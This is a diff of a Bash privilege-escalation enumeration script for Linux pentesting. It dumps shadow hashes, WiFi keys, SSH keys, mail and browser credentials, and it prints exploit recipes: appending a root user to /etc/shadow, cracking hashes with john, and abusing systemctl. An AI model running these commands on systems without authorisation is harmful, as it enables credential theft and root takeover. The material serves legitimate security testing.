@@ -4,8 +4,8 @@
 
 #------------------> Color Code:
 RED="\033[01;31m"
-BLUE="\033[1;34;40m"
-GREEN="\033[01;32;40m"
+BLUE="\033[0;37;44m"
+GREEN="\033[01;40m"
 XX="\033[0m" #--- COLSE COLOR
 #------------------> Clear Screen:
 echo -e "\n\n${RED}╚════{Clearing Terminal${XX}"
@@ -51,7 +51,7 @@ echo -e "\tAʟʟ ᴛʜᴇ ᴇxᴘʟᴏɪᴛs ʜᴀᴠᴇ ʙᴇᴇɴ ʟɪsᴛᴇ�
 sleep 0.1
 echo -e "\n${BLUE}Rᴇᴄᴏᴍᴍᴇɴᴅᴀᴛɪᴏɴ:${XX}"
 sleep 0.1
-echo -e "\tFᴏʀ ᴀ ʙᴇᴛᴛᴇʀ ᴠɪᴇᴡ ᴏғ ᴛʜᴇ ʀᴇᴘᴏʀᴛ ɪs ɪᴛ ʀᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ ʀᴇᴅɪʀᴇᴄᴛɪɴɢ ᴛʜᴇ ᴏᴜᴛᴘᴜᴛ ᴛᴏ ᴀ ғɪʟᴇ: ./ᴘʀᴏᴊᴇᴄᴛHULK.sʜ > PE_ʀᴇᴘᴏʀᴛ.ᴛxᴛ"
+echo -e "\tFᴏʀ ᴀ ʙᴇᴛᴛᴇʀ ᴠɪᴇᴡ ᴏғ ᴛʜᴇ ʀᴇᴘᴏʀᴛ ɪs ɪᴛ ʀᴇᴄᴏᴍᴍᴇɴᴅᴇᴅ ʀᴇᴅɪʀᴇᴄᴛɪɴɢ ᴛʜᴇ ᴏᴜᴛᴘᴜᴛ ᴛᴏ ᴀ ғɪʟᴇ: ./ᴘʀᴏᴊᴇᴄᴛHULK.sh > PE_ʀᴇᴘᴏʀᴛ.ᴛxᴛ"
 echo -e "\tNᴇᴠᴇʀ ʀᴇʟᴀʏ ᴏɴ ᴀ sɪɴɢʟᴇ ᴛᴏᴏʟ, ᴅᴏ ᴍᴀɴᴜᴀʟ ᴇɴᴜᴍᴇʀᴀᴛɪᴏɴ ᴀɴᴅ ᴛʀʏ ᴛᴏ ᴜsᴇ ᴍᴀɴʏ ᴛᴏᴏʟs ᴀs ᴍᴜᴄʜ ᴀs ʏᴏᴜ ᴄᴀɴ."
 sleep 0.1
 echo -e "\n${BLUE}Sᴄᴀɴ Sᴛᴀʀᴛᴇᴅ Aᴛ:${XX}"
@@ -84,7 +84,7 @@ echo -e "\n${BLUE}[+] Users with console:${XX}"
 echo -e "\n${BLUE}[+] Total number of users:${XX}"
     getent passwd | wc -l
 echo -e "\n${BLUE}[+] Can we read other users’ history files?${XX}"
-    find /* -name *.*history* -print 2>/dev/null
+    find /* -iname *.*history* -print 2>/dev/null
 echo -e "\n${BLUE}[+] Are we in a restricted shell?${XX}"
     env | grep -i "rbash\|chroot"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
@@ -161,8 +161,8 @@ echo -e "\n${BLUE}[+] Each field is separated by a colon, and represents a diffe
 echo -e "\n${BLUE}[+] Password file:${XX}"
     ls -la /etc/passwd --color=always
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║If the file has written permission, it can be abused by adding a new user with root privilege to the file. If it's  ║"
-        echo -e "\t║no't writable, then it's protected.                                                                                 ║"
+        echo -e "\t║If the file has write permission to the curent user or curent user group, it can be abused by adding a new user with║"
+        echo -e "\t║root privilege to the file. If those flag are not set, then the file is protected.                                  ║"
         echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
         echo -e "\t║${RED}First, generate a password with one of the following commands:${XX}                                                      ║"
         echo -e "\t║    ${RED}openssl passwd -1 -salt hulk password${XX}                                                                           ║"
@@ -177,16 +177,20 @@ echo -e "\n${BLUE}[+] Password file:${XX}"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Reading Password File:${XX}"
     cat /etc/passwd | grep -E ":0:0:|$"
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║All linux systems will print this information, our aim is to find hash value to be cracked. However, the file can be║"
+        echo -e "\t║protected by not giving read permission to othe groups or users on the system.                                      ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Hash in Password file:${XX}"
     grep  -v 'x' /etc/passwd
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║If any hash is found in the /etc/passwd, the attacker my try to crack it by using any hash cracker software, tools. ║"
+        echo -e "\t║If any hash is found in the /etc/passwd, the attacker my try to crack it by using any hash cracker software or tool ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Shadow file:${XX}"
     ls -la /etc/shadow --color=always
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║If the file has read/write permission, it can abuse by replacing the root HASH with the attacker's HASH or the      ║"
-        echo -e "\t║attacker my copy the hash & try to crack it.                                                                        ║"
+        echo -e "\t║If the file has write or read permission to the curent user or curent user group, it can abuse by replacing the root║"
+        echo -e "\t║HASH with the attacker's HASH or the attacker my copy the hash & try to crack it.                                   ║"
         echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
         echo -e "\t║${RED}1) Generate a new Shadow Hash and replace it with the current root hash:${XX}                                            ║"
         echo -e "\t║    ${RED}- mkpasswd  -m sha-512 -S prove123 -s${XX}                                                                           ║"
@@ -197,6 +201,7 @@ echo -e "\n${BLUE}[+] Shadow file:${XX}"
         echo -e "\t║${RED}echo 'privesc:Npge08pfz4wuk:0:0:privesc,,,:/:/bin/bash' >> /etc/shadow${XX}                                              ║"
         echo -e "\t║${RED}This adds a root privilege user 'privesc' with the password 'password'${XX}                                              ║"
         echo -e "\t║Read More:                                                                                                          ║"
+        echo -e "\t║    https://linuxize.com/post/etc-shadow-file/                                                                      ║"
         echo -e "\t║    https://blog.geoda-security.com/2019/02/privilege-escalation-exploiting-write.html                              ║"
         echo -e "\t║Protect the file by limiting the access to it:                                                                      ║"
         echo -e "\t║    chmod 600 /etc/shadow                                                                                           ║"
@@ -206,9 +211,11 @@ echo -e "\n${BLUE}[+] Reading shadow File:${XX}"
 echo -e "\n${BLUE}[+] Hash in Shadow file: (Interesting :D)${XX}"
     grep  -v '*:\|!:' /etc/shadow
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║Crack the hash using online website or any cracking tools or simply do:                                             ║"
+        echo -e "\t║Crack the hash using online website or any cracking tools or run this on the target machine:                        ║"
         echo -e "\t║    ${RED}unshadow /etc/passwd /etc/shadow > shadow.john${XX}                                                                  ║"
         echo -e "\t║    ${RED}john shadow.john --wordlist=<WORLD_LIST>${XX}                                                                        ║"
+        echo -e "\t║You may also crack the hash by copying the hash or shadow.john file to your OS and do:                              ║"
+        echo -e "\t║    ${RED}john –wordlist=<WORLD_LIST> hash${XX}                                                                                ║"
         echo -e "\t║If you own the system and have root, you can use MimiPenguin to crack it:                                           ║"
         echo -e "\t║    https://github.com/huntergregal/mimipenguin                                                                     ║"
         echo -e "\t║    https://github.com/sevagas/swap_digger                                                                          ║"
@@ -223,58 +230,80 @@ echo -e "\n${BLUE}[+] Sudoers File:${XX}"
 echo -e "\n${BLUE}[+] Reading Sudoers File:${XX}"
     cat /etc/sudoers | grep -E --color=always 'ALL|$'
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║The file shows a fully detailed about what the current user my run as root. If the running file or the application  ║"
-        echo -e "\t║has a global vulnerability, the attacker may google it and abuse it for user escalation.                            ║"
-        echo -e "\t║    https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d            ║"
+        echo -e "\t║The sudo command allows non root users to run commands that would normally require super user privileges. If the    ║"
+        echo -e "\t║running file or the application has a global vulnerability or file permission misconfiguration, the attacker may    ║"
+        echo -e "\t║google the vulnerability or abuse the file for user escalation.                                                     ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] User Group list:${XX}"
     ls -la /etc/group --color=always
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║It stores group information or defines the user groups i.e. it defines the groups to which users belong.            ║"
+        echo -e "\t║Read more:                                                                                                          ║"
+        echo -e "\t║  https://www.cyberciti.biz/faq/understanding-etcgroup-file/                                                        ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Content of User Group list:${XX}"
     cat /etc/group 
 echo -e "\n${BLUE}[+] Password Policy:${XX}"
-    grep --color=always "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs 
-echo -e "\n${BLUE}[+] WiFi Creds:${XX}"
-    ls -la /etc/NetworkManager/system-connections
+    grep --color=always "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║Try to read the following files manually and see if they have any passwords stored inside them.                     ║"
+        echo -e "\t║Read more:                                                                                                          ║"
+        echo -e "\t║  https://www.linuxfordevices.com/tutorials/linux/linux-password-policies                                           ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
-echo -e "\n${BLUE}[+] Sensitive files:${XX}"
-    ls -la /etc/passwd --color=always 2>/dev/null; ls -la /etc/group --color=always 2>/dev/null; ls -la /etc/profile --color=always 2>/dev/null; ls -la /etc/shadow --color=always 2>/dev/null ; ls -la /etc/master.passwd --color=always 2>/dev/null
-        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║${RED}See if any listed files have weak file permission.${XX}                                                                  ║"
-        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
-echo -e "\n${BLUE}[+] htpasswd:${XX}"
-    find / -name .htpasswd -print -exec cat {} \; 2>/dev/null
-        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║It is a flat-file used to store usernames and password. This file is generally used by the web server software like ║"
-        echo -e "\t║Apache, Nginx, etc. in order to verify the users via HTTP basic authentication they are in ASCII text format. The   ║"
-        echo -e "\t║hash maybe cracked using online tools or any cracking password tools.                                               ║"
-        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
-echo -e "\n${BLUE}[+] In memory passwords:${XX}"
-    strings /dev/mem -n10 | grep -i PASS
-echo -e "\n${BLUE}[+] Old passwords:${XX}"
-    ls -la /etc/security/opasswd --color=always
-echo -e "\n${BLUE}[+] Reading Old passwords:${XX}"
-    cat /etc/security/opasswd
-echo -e "\n${BLUE}[+] Root History File:${XX}"
-    s -la /root/.*_history --color=always 2>/dev/null
-echo -e "\n${BLUE}[+] Password Files:${XX}"
-    find / -name passwd -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
-echo -e "\n${BLUE}[+] apache2.conf:${XX}"
-    cat /etc/apache2/apache2.conf | grep -i "pass\|cred\|hash" --color=always
-        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║Read the full file for more inofrmation.                                                                            ║"
-        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
-echo -e "\n${BLUE}[+] smb.conf:${XX}"
-    cat /etc/samba/smb.conf | grep -i 'pass\|cred\|hash' --color=always
+echo -e "\n"
+echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
+echo -e "${RED} \t\t ═══════════════════════════════════════[ Credentials Harvesting ]═══════════════════════════════════════ ${XX}"
+echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
+echo -e "\n"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║To list all files having the word password/credentials/hash do the following manually:                              ║"
         echo -e "\t║${RED}grep -rn -i 'pass\|cred\|hash' / --color=always > password.txt${XX}                                                      ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
-        echo -e "\n${BLUE}[+] Dump cleartext Pre-Shared Wireless Keys:${XX}"
-    cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -i "id\|psk"
-echo -e "\n${BLUE}[+] Configuration files that might contain sensitive information:${XX}"
-    grep "pass\|cred\|hash" /etc/*.conf 2>/dev/null --color=always
+sleep 1
+echo -e "\n${BLUE}[+] Find 'Pass, Hash, Cred' as a file name:${XX}"
+    find / -iname "*pass*" -o -iname "*hash*" -o -iname "*cred*" 2> /dev/null | xargs ls -ld 2> /dev/null --color=always | grep -v "/usr/\|/var/\|/opt/\|/sys/"
+        echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e  "\t║Excluded: /usr/ | /var/ | /opt/ | /sys/                                                                             ║"
+        echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Bash History:${XX}"
+    find / -iname *_history -xdev 2> /dev/null | xargs ls -ld
+        echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e  "\t║Bash and other scripting languages, along with various services often store previous commands run in the system,    ║"
+        echo -e  '\t║which could contain clear-text or encoded passwords if they are hard-coded in the command itself                    ║'
+        echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] /etc/security/opasswd file permission:${XX}"
+    ls -la /etc/security/opasswd
+echo -e "\n${BLUE}[+] Reading old passwords in /etc/security/opasswd:${XX}"
+    cat /etc/security/opasswd
+        echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e  "\t║The /etc/security/opasswd file is used by pam_cracklib (a module used in Linux to ensure a good password policy is  ║"
+        echo -e  '\t║in place) to store the hashed version of old passwords used on the system to prevent users from reusing the same    ║'
+        echo -e  '\t║over and over again.                                                                                                ║'
+        echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] In memory passwords:${XX}"
+    strings /dev/mem -n10 | grep -i PASS
+        echo -e  "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e  "\t║Services will sometimes store the credentials entered by the end user in clear text in memory. The commands below   ║"
+        echo -e  '\t║can help find credentials stored in processes                                                                       ║'
+        echo -e  "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Password Files:${XX}"
+    find / -iname passwd -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
+echo -e "\n${BLUE}[+] WiFi Creds:${XX}"
+    ls -la /etc/NetworkManager/system-connections
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║Try to read the following files manually and see if they have any password stored inside them.                      ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Sensitive files:${XX}"
+    ls -la /etc/passwd --color=always 2>/dev/null; ls -la /etc/group --color=always 2>/dev/null; ls -la /etc/profile --color=always 2>/dev/null; ls -la /etc/shadow --color=always 2>/dev/null ; ls -la /etc/master.passwd --color=always 2>/dev/null
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║${RED}See if any listed files have weak file permission${XX}                                                                   ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] htpasswd:${XX}"
+    find / -iname .htpasswd -print -exec cat {} \; 2>/dev/null
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║It is a flat-file used to store usernames and password. This file is generally used by the web server software like ║"
+        echo -e "\t║Apache, Nginx, etc. in order to verify the users via HTTP basic authentication they are in ASCII text format.The    ║"
+        echo -e "\t║hash maybe cracked using online tools or any cracking password tools.                                               ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Firefox credentials:${XX}"
     ls -la /home/$USER/.mozilla/firefox 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
@@ -286,6 +315,19 @@ echo -e "\n${BLUE}[+] Firefox credentials:${XX}"
         echo -e "\t║You can use firefox_decrypt.py tool:                                                                                ║"
         echo -e "\t║    https://github.com/unode/firefox_decrypt                                                                        ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Passwords in smb.conf file:${XX}"
+    cat /etc/samba/smb.conf | grep -i 'pass\|cred\|hash' --color=always
+echo -e "\n${BLUE}[+] Dump cleartext Pre-Shared Wireless Keys:${XX}"
+    cat /etc/NetworkManager/system-connections/* 2>/dev/null | grep -i "id\|psk"
+echo -e "\n${BLUE}[+] Find config.* files 'Excluded /var/ | /usr/':${XX}"
+    find / -iname config.* 2> /dev/null | grep -v '/var/\|/usr/' | xargs ls -ld
+echo -e "\n${BLUE}[+] Any credentials in apache2.conf file:${XX}"
+    cat /etc/apache2/apache2.conf | grep -i "pass\|cred\|hash" --color=always
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║Read the full file for more inofrmation.                                                                            ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Configuration files that might contain sensitive information:${XX}"
+    grep "pass\|cred\|hash" /etc/*.conf 2>/dev/null --color=always
 echo -e "\n"
 echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
 echo -e "${RED} \t\t ═════════════════════════════════════════[ System Information ]═════════════════════════════════════════ ${XX}"
@@ -340,9 +382,9 @@ echo -e "\n${BLUE}[+] Is sudo version vulnerable?${XX}"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Available shells:${XX}"
     cat /etc/shells 2>/dev/null
-echo -e "\n\033[0;37;44m[+] Bash version:${XX}"
+echo -e "\n${BLUE}[+] Bash version:${XX}"
     bash --version | grep version 2>/dev/null
-echo -e "\n\033[0;37;44m[+] Check Bash Shellshock vulnerability:${XX}"
+echo -e "\n${BLUE}[+] Check Bash Shellshock vulnerability:${XX}"
     env x='() { :;}; echo bash is vulnerable' bash -c 'echo bash is not vulnerable'
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Other test:                                                                                                         ║"
@@ -399,6 +441,12 @@ echo -e "\n${BLUE}[+] Abusing systemctl:${XX}"
         echo -e "\t║    systemctl enable /tmp/NewRCE.service                                                      ║"
         echo -e "\t║    systemctl start NewRCE                                                                    ║"
         echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Total number of installed packages:${XX}"
+    apt list --installed | wc -l 2>/dev/null
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║You can display all installed packages by doing:                                                                    ║"
+        echo -e "\t║    apt list --installed                                                                                            ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n\n${RED}\t\tEnumeration on progress ╔══════════════════.................(20%).....................................${XX}\n"
 sleep 5
 echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
@@ -486,6 +534,8 @@ echo -e "\n\033[0;37;41mRun this command manually: find / -writable -type f 2>/d
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] World writable directories:${XX}"
     find / -type d \( -perm -g+w -o -perm -o+w \) -exec ls -lad --color=always {} \; 2>/dev/null
+echo -e "\n${BLUE}[+] World executable folders:${XX}"
+    find / -perm o=x -type d 2>/dev/null
 echo -e "\n${BLUE}[+] writable config files:${XX}"
     find /etc/ -writable -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null
 echo -e "\n${BLUE}[+] How Files Can Be Upload/Download:${XX}"
@@ -511,7 +561,7 @@ echo -e "\n${BLUE}[+] Profiles files:${XX}"
         echo -e "\t║Therefore, if you can write or modify any of the files, you can escalate your privilege.                            ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Is the .bashrc file writable?${XX}"
-    ls -la /home/*/.bashrc; locate .bashrc | xargs ls -la --color=always; find / -name .bashrc -xdev 2>/dev/null | xargs ls -la --color=always
+    ls -la /home/*/.bashrc; locate .bashrc | xargs ls -la --color=always; find / -iname .bashrc -xdev 2>/dev/null | xargs ls -la --color=always
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If so, malicious commands can be written to it and will be executed when the user/root logs in.                     ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
@@ -651,7 +701,7 @@ echo -e "\n\033[0;37;41mExploiting Misconfigured SSH Keys${XX}"
         echo -e "\t║    https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/                      ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] id_rsa:${XX}"
-    find / -name id_rsa 2>/dev/null
+    find / -iname id_rsa 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If anyone have access to any user's id_rsa, he can login to the system using that key.                              ║"
         echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
@@ -663,9 +713,9 @@ echo -e "\n${BLUE}[+] id_rsa:${XX}"
         echo -e "\t║    https://book.hacktricks.xyz/pentesting/pentesting-ssh                                                           ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] id_dsa:${XX}"
-    find / -name id_dsa 2>/dev/null
+    find / -iname id_dsa 2>/dev/null
 echo -e "\n${BLUE}[+] authorized_keys:${XX}"
-    find / -name authorized_keys 2>/dev/null
+    find / -iname authorized_keys 2>/dev/null
 echo -e "\n${BLUE}[+] ssh_config File:${XX}"
     ls -la /etc/ssh/ssh_config --color=always
 echo -e "\n${BLUE}[+] Reading ssh_config File:${XX}"
@@ -708,6 +758,8 @@ echo -e "\n"
 sleep 1
 echo -e "\n${BLUE}[+] Mail File:${XX}"
     ls -la /var/mail/ --color=always 2>/dev/null
+echo -e "\n${BLUE}[+] Reading Mail File:${XX}"
+    cat /var/mail/*
 echo -e "\n${BLUE}[+] List Root Directory:${XX}"
     ls -la /root/ 2>/dev/null --color=always
 echo -e "\n${BLUE}[+] Home Directory:${XX}"
@@ -715,7 +767,7 @@ echo -e "\n${BLUE}[+] Home Directory:${XX}"
 echo -e "\n${BLUE}[+] Tmp Directory:${XX}"
     ls -la /tmp  --color=always 2>/dev/null
 echo -e "\n${BLUE}[+] Backup Directory:${XX}"
-    ls -la /var/backups 2>/dev/null && find / -type f  -name *backup* -o -name *.bak -o -name *.bak* -o -name *.bck -o -name *.bk -o -name *.old*  2>/dev/null  | xargs ls -la 2>/dev/null --color=always | grep backup
+    ls -la /var/backups 2>/dev/null && find / -type f  -iname *backup* -o -iname *.bak -o -iname *.bak* -o -iname *.bck -o -iname *.bk -o -iname *.old*  2>/dev/null  | xargs ls -la 2>/dev/null --color=always | grep backup
 echo -e "\n${BLUE}[+] Apache2 Version:${XX}"
     apache2 -v 2>/dev/null; httpd -v 2>/dev/null
 echo -e "\n${BLUE}[+] Apache user:${XX}"
@@ -743,6 +795,7 @@ echo -e "\n${BLUE}[+] Spool File:${XX}"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Contains data which is awaiting some kind of later processing. Data in /var/spool represents║"
         echo -e "\t║work to be done in the future (by a program, user, or administrator); often data is deleted ║"
+        echo -e "\t║PS: Have a look at the mail directory.                                                      ║"
         echo -e "\t║after it has been processed. Read More:                                                     ║"
         echo -e "\t║    https://refspecs.linuxfoundation.org/FHS_3.0/fhs/ch05s14.html                           ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
@@ -758,42 +811,24 @@ echo -e "\n${BLUE}[+] Tools/Languages Installed:${XX}"
         echo -e "\t║Some of the tools have an exploit, do compgen -c to list all of the tools. Exploit:         ║"
         echo -e "\t║    https://gtfobins.github.io/                                                             ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
-echo -e "\n${BLUE}[+] Read roots mail:${XX}"
-    head /var/mail/root 2>/dev/null
 echo -e "\n${BLUE}[+] Config Files:${XX}"
-    find / -name *.config -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
-echo -e "\n${BLUE}[+] Bash Files:${XX}"
-    find / -name *.sh -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/firmware-mod-kit/"
-        echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║smash2root search has excluded the following directory:-                       ║"
-        echo -e "\t║  /usr/*       |  /opt/firmware-mod-kit/*                                      ║"
-        echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
-echo -e "\n${BLUE}[+] Python Files:${XX}"
-    find / -name *.py -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/firmware-mod-kit/\|/opt/xplico/"
-        echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║smash2root search has excluded the following directory:-                       ║"
-        echo -e "\t║  /usr/*       |  /opt/firmware-mod-kit/*       |  /opt/xplico/*               ║"
-        echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
-echo -e "\n${BLUE}[+] PHP Files:${XX}"
-    find / -name *.php -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/share\|/opt/xplico"
-        echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║smash2root search has excluded the following directory:-                       ║"
-        echo -e "\t║  /usr/*       |  /opt/xplico/*                                                ║"
-        echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
+    find / -iname *.config -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
+echo -e "\n${BLUE}[+] Bash Files 'Excluded /usr/ | /opt/':${XX}"
+    find / -iname *.sh -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"
+echo -e "\n${BLUE}[+] Python Files 'Excluded /usr/ | /opt/':${XX}"
+    find / -iname *.py -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"
+echo -e "\n${BLUE}[+] PHP Files 'Excluded /usr/ | /opt/':${XX}"
+    find / -iname *.php -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always | grep -v "/usr/\|/opt/"
 echo -e "\n${BLUE}[+] Text Files:${XX}"
-    find / -name *.txt 2>/dev/null | grep -v "/usr/\|/opt/\|/etc/\|/root/.*" | xargs ls -la --color=always 2>/dev/null
+    find / -iname *.txt 2>/dev/null | grep -v "/usr/\|/opt/\|/etc/\|/root/.*" | xargs ls -la --color=always 2>/dev/null
         echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║smash2root search has excluded the following directory:-                       ║"
+        echo -e "\t║smach2root search has excluded the following directory:-                       ║"
         echo -e "\t║  /usr/*       |  /opt/       |  /etc/       |  /root/.*                       ║"
         echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
-echo -e "\n${BLUE}[+] HTML Files:${XX}"
-    find / -name *.html 2>/dev/null | grep -v "/usr/" | xargs ls -la --color=always 2>/dev/null 
-        echo -e "\t╔═══════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║smash2root search has excluded the following directory:-                       ║"
-        echo -e "\t║  /usr/*                                                                       ║"
-        echo -e "\t╚═══════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] HTML Files 'Excluded /usr/':${XX}"
+    find / -iname *.html 2>/dev/null | grep -v "/usr/" | xargs ls -la --color=always 2>/dev/null 
 echo -e "\n${BLUE}[+] .GPG Files:${XX}"
-    find / -name *.gpg -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
+    find / -iname *.gpg -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║A GPG file is a security key used to decrypt an encrypted file generated by GNU Privacy     ║"
         echo -e "\t║Guard (GnuPG), a file encryption program. The secure format is based on the OpenPGP         ║"
@@ -801,9 +836,9 @@ echo -e "\n${BLUE}[+] .GPG Files:${XX}"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] KeePass database file:${XX}"
 echo -e "[*] .kdbx files:"
-    find / -name *.kdbx -type f 2>/dev/null
+    find / -iname *.kdbx -type f 2>/dev/null
